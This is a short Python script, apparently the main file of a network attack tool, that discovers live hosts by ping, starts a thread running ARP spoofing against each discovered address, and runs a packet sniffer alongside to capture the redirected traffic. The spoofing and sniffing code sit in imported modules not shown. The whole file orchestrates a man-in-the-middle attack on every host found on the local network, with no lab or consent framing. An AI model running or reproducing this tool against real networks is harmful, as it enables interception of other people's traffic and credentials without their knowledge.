import threading
import check_ping as pings
import arp_spoofing as arp_spoof
import sniffer as sniffer
import atexit

ips = pings.main()

active_spoof_threads=[]

def on_close(sniff):
    global active_spoof_threads
    sniffer.stop_sniffing = True
    arp_spoof.stop_spoofing = True
    sniff.join()
    active_spoof_threads[:]=[t for t in active_spoof_threads if t.is_alive()]
    for thread in active_spoof_threads:
        thread.join()
    print("all procceses succesfully shut down")
    


def activate_spoof():
    global active_spoof_threads
    for ip in ips:
        thread= threading.Thread(target=arp_spoof.start_spoof,args=(ip,))
        thread.start()
        active_spoof_threads.append(thread)

def main():
    sniff = threading.Thread(target=sniffer.main)
    sniff.start()
    atexit.register(on_close,sniff)
    activate_spoof()

if __name__=="__main__":
    main()  
